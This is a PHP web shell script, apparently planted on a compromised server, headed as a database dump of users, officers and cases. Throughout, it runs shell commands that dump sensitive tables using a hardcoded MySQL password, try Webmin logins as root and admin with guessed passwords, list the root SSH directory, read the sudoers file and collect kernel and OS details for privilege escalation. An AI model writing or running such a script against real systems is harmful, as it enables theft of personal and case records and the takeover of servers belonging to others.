<?php
// F056 Database dump - users, officers, cases (most sensitive)
header('Content-Type: text/plain; charset=utf-8');

echo "=== USERS TABLE ===\n";
echo shell_exec('mysql -u adminer -p"cgts2026!" vec_cgts -e "SELECT * FROM users LIMIT 20;" 2>&1') . "\n";

echo "\n=== OFFICERS TABLE ===\n";
echo shell_exec('mysql -u adminer -p"cgts2026!" vec_cgts -e "SELECT * FROM officers LIMIT 10;" 2>&1') . "\n";

echo "\n=== CASES COUNT + SAMPLE ===\n";
echo shell_exec('mysql -u adminer -p"cgts2026!" vec_cgts -e "SELECT COUNT(*) as total FROM cases; SELECT * FROM cases LIMIT 3;" 2>&1') . "\n";

echo "\n=== APP SETTINGS ===\n";
echo shell_exec('mysql -u adminer -p"cgts2026!" vec_cgts -e "SELECT * FROM app_settings;" 2>&1') . "\n";

echo "\n=== WEbMIN LOGIN ATTEMPT ===\n";
// Try logging into Webmin from inside
echo shell_exec('curl -sk -X POST "https://127.0.0.1:12321/session_login.cgi" -d "user=root&pass=cgts2026!" -o /dev/null -w "%{http_code}" 2>&1') . "\n";
echo shell_exec('curl -sk -X POST "https://127.0.0.1:12321/session_login.cgi" -d "user=admin&pass=admin" -o /dev/null -w "%{http_code}" 2>&1') . "\n";

echo "\n=== ROOT SSH KEY ===\n";
echo shell_exec('ls -la /root/.ssh/ 2>&1') . "\n";

echo "\n=== SUDOERS ===\n";
echo shell_exec('cat /etc/sudoers 2>&1 | grep -v "^#" | grep -v "^$"') . "\n";
echo shell_exec('ls /etc/sudoers.d/ 2>&1') . "\n";

echo "\n=== KERNEL VERSION ===\n";
echo shell_exec('uname -a 2>&1') . "\n";
echo shell_exec('cat /etc/os-release 2>&1') . "\n";

echo "\n=== END ===\n";
?>
